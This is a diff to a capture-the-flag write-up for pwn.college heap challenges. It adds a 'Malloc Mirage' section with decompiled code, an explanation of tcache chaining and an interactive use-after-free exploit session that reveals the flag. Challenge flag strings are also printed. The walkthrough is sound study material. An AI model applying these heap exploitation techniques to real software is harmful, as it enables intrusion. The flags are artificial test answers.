@@ -860,6 +860,7 @@ free(a)
 
 a = malloc(16)
 
+
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
 ┊  tcache_perthread_struct Void                                        ┊
 ┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
@@ -894,9 +895,9 @@ a = malloc(16)
 
 When `free()` is called on a chunk that fits in the Tcache, the allocator checks if that chunk's `key` field already points to the `tcache_perthread_struct` for the current thread.
 
-If `key == tcache`, the allocator scans the relevant Tcache bin to see if that chunk is already there. If it finds it, the program crashes with a "double free or corruption (tcache)" error.
+If `key == tcache_perthread_struct`, the allocator scans the relevant Tcache bin to see if that chunk is already there. If it finds it, the program crashes with a "double free or corruption (tcache)" error.
 
-If `key != tcache`, the allocator assumes the chunk is currently allocated and proceeds to add it to the Tcache.
+If `key != tcache_perthread_struct`, the allocator assumes the chunk is currently allocated and proceeds to add it to the Tcache.
 
 ```
 a = malloc(16)
@@ -908,6 +909,7 @@ free(a)
 a = malloc(16)
 
 free(a)
+
 
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
 ┊  tcache_perthread_struct Void                                        ┊
@@ -1143,3 +1145,340 @@ Data: pwn.college{Amc7hATLzmOx9D_YV-iznVKLvb-.0FO3MDL4ITM0EzW}
 
 ### Goodbye!
 ```
+
+&nbsp;
+
+## Malloc Mirage (Easy)
+
+```
+hacker@dynamic-allocator-misuse~malloc-mirage-easy:~$ /challenge/malloc-mirage-easy 
+###
+### Welcome to /challenge/malloc-mirage-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): read_flag
+
+[*] flag_buffer = malloc(896)
+[*] flag_buffer = 0x6293f46682c0
+[*] read the flag!
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): 
+```
+
+Let's see what the program does by decompiling the binary.
+
+### Binary Analysis
+
+```c title="/challenge/malloc-mirage-easy :: main()" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  int i; // [rsp+24h] [rbp-13Ch]
+  unsigned int v6; // [rsp+28h] [rbp-138h]
+  unsigned int v7; // [rsp+28h] [rbp-138h]
+  unsigned int v8; // [rsp+28h] [rbp-138h]
+  unsigned int size; // [rsp+2Ch] [rbp-134h]
+  const char *size_4; // [rsp+30h] [rbp-130h]
+  void *ptr[16]; // [rsp+40h] [rbp-120h] BYREF
+  char choice[136]; // [rsp+C0h] [rbp-A0h] BYREF
+  unsigned __int64 v13; // [rsp+148h] [rbp-18h]
+
+  v13 = __readfsqword(40u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 1uLL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  puts(
+    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
+  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
+  printf("This challenge can manage up to %d unique allocations.\n\n", 16LL);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            print_tcache(main_thread_tcache);
+            puts(byte_2419);
+            printf("[*] Function (malloc/free/puts/read_flag/puts_flag/quit): ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_2419);
+            if ( strcmp(choice, "malloc") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_2419);
+            v6 = atoi(choice);
+            if ( v6 > 15 )
+              __assert_fail("allocation_index < 16", "<stdin>", 228u, "main");
+            printf("Size: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_2419);
+            size = atoi(choice);
+            printf("[*] allocations[%d] = malloc(%d)\n", v6, size);
+            ptr[v6] = malloc(size);
+            printf("[*] allocations[%d] = %p\n", v6, ptr[v6]);
+          }
+          if ( strcmp(choice, "free") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", choice);
+          puts(byte_2419);
+          v7 = atoi(choice);
+          if ( v7 > 15 )
+            __assert_fail("allocation_index < 16", "<stdin>", 246u, "main");
+          printf("[*] free(allocations[%d])\n", v7);
+          free(ptr[v7]);
+        }
+        if ( strcmp(choice, "puts") )
+          break;
+        printf("Index: ");
+        __isoc99_scanf("%127s", choice);
+        puts(byte_2419);
+        v8 = atoi(choice);
+        if ( v8 > 15 )
+          __assert_fail("allocation_index < 16", "<stdin>", 259u, "main");
+        printf("[*] puts(allocations[%d])\n", v8);
+        printf("Data: ");
+        puts((const char *)ptr[v8]);
+      }
+      if ( strcmp(choice, "read_flag") )
+        break;
+      for ( i = 0; i <= 0; ++i )
+      {
+        printf("[*] flag_buffer = malloc(%d)\n", 896LL);
+        size_4 = (const char *)malloc(896uLL);
+        *(_QWORD *)size_4 = 0LL;
+        printf("[*] flag_buffer = %p\n", size_4);
+      }
+      v3 = open("/flag", 0);
+      read(v3, (void *)(size_4 + 16), 128uLL);
+      puts("[*] read the flag!");
+    }
+    if ( strcmp(choice, "puts_flag") )
+      break;
+    if ( *(_QWORD *)size_4 )
+      puts(size_4 + 16);
+    else
+      puts("Not authorized!");
+  }
+  if ( strcmp(choice, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+So if we pass the `read_flag` command, the program zeroes out the first 8 bytes represented by `size_4` of that allocation. The flag is then read 16 bytes after `size_4`.
+
+```c showLineNumbers
+# ---- snip ----
+
+      if ( strcmp(choice, "read_flag") )
+        break;
+      for ( i = 0; i <= 0; ++i )
+      {
+        printf("[*] flag_buffer = malloc(%d)\n", 896LL);
+        size_4 = (const char *)malloc(896uLL);
+        *(_QWORD *)size_4 = 0LL;
+        printf("[*] flag_buffer = %p\n", size_4);
+      }
+      v3 = open("/flag", 0);
+      read(v3, (void *)(size_4 + 16), 128uLL);
+      puts("[*] read the flag!");
+
+# ---- snip ----      
+```
+
+Then, if we pass `puts_flag`, it checks if the `size_4` is zeroed out. If it is, the flag is not printed.
+
+```c showLineNumbers
+# ---- snip ----
+
+    if ( strcmp(choice, "puts_flag") )
+      break;
+    if ( *(_QWORD *)size_4 )
+      puts(size_4 + 16);
+    else
+      puts("Not authorized!");
+
+# ---- snip ----
+```
+
+### Tcache chunk chaining
+
+When `free()` is called on a chunk that fits in the Tcache, the allocator checks if that chunk's `key` field already points to the `tcache_perthread_struct` for the current thread.
+
+If `key == tcache_perthread_struct`, the allocator scans the relevant Tcache bin to see if that chunk is already there. If it finds it, the program crashes with a "double free or corruption (tcache)" error.
+
+If `key != tcache_perthread_struct`, the allocator assumes the chunk is currently allocated and proceeds to add it to the Tcache by setting that chunk's `key` pointer to the `tcache_perthread_struct` for the current thread. It also adds that chunk to the beginning of the singly-linked list by setting the chunks `next` pointer to the address of the previously first chunk.
+
+```
+a = malloc(16)
+b = malloc(16)
+
+free(b)
+free(a)
+
+
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┊  tcache_perthread_struct Void                                        ┊
+┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
+┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
+┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
+┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
+┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+                         │
+         ╭───────────────╯         
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry A  ┆
+├──────────────────┤
+│    next: &B      │ ────╮
+├──────────────────┤     │
+│    key: Void     │     │
+└──────────────────┘     │
+                         │
+         ╭───────────────╯         
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry B  ┆
+├──────────────────┤
+│    next: NULL    │ 
+├──────────────────┤
+│    key: Void     │ 
+└──────────────────┘
+```
+
+Knowing this, if we make the program read the flag to a chunk that we control using UAF, and then free that chunk, when it's `next` pointer is be set, the `size_4` check is overwritten.
+We can `free` that chunk, because `read_flag` causes the `key` pointer which was pointing to `tcache_perthread_struct`, to be overwritten.
+
+Thus we will be able to use the `puts_flag` command and get the flag.
+
+### Exploit
+
+```
+hacker@dynamic-allocator-misuse~malloc-mirage-easy:~$ /challenge/malloc-mirage-easy 
+###
+### Welcome to /challenge/malloc-mirage-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc
+
+Index: 0
+
+Size: 896
+
+[*] allocations[0] = malloc(896)
+[*] allocations[0] = 0x644fee8f22c0
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc
+
+Index: 1
+
+Size: 896
+
+[*] allocations[1] = malloc(896)
+[*] allocations[1] = 0x644fee8f2650
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free
+
+Index: 1
+
+[*] free(allocations[1])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 1     | HEAD: 0x644fee8f2650       | KEY: 0x644fee8f2010        |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free
+
+Index: 0
+
+[*] free(allocations[0])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 2     | HEAD: 0x644fee8f22c0       | KEY: 0x644fee8f2010        |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x644fee8f22c0      | 0                   | 0x391 (P)                    | 0x644fee8f2650      | 0x644fee8f2010      |
+| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): read_flag
+
+[*] flag_buffer = malloc(896)
+[*] flag_buffer = 0x644fee8f22c0
+[*] read the flag!
++====================+========================+==============+============================+============================+
+| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 1     | HEAD: 0x644fee8f2650       | KEY: 0x644fee8f2010        |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free
+
+Index: 0
+
+[*] free(allocations[0])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 2     | HEAD: 0x644fee8f22c0       | KEY: 0x644fee8f2010        |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x644fee8f22c0      | 0                   | 0x391 (P)                    | 0x644fee8f2650      | 0x644fee8f2010      |
+| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): puts_flag
+
+pwn.college{YaCr8LqQNO7XOxRVrb2l58ayfLL.0VO3MDL4ITM0EzW}
+
++====================+========================+==============+============================+============================+
+| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 2     | HEAD: 0x644fee8f22c0       | KEY: 0x644fee8f2010        |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x644fee8f22c0      | 0                   | 0x391 (P)                    | 0x644fee8f2650      | 0x644fee8f2010      |
+| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/read_flag/puts_flag/quit): quit
+
+### Goodbye!
+```
+
+&nbsp;
+
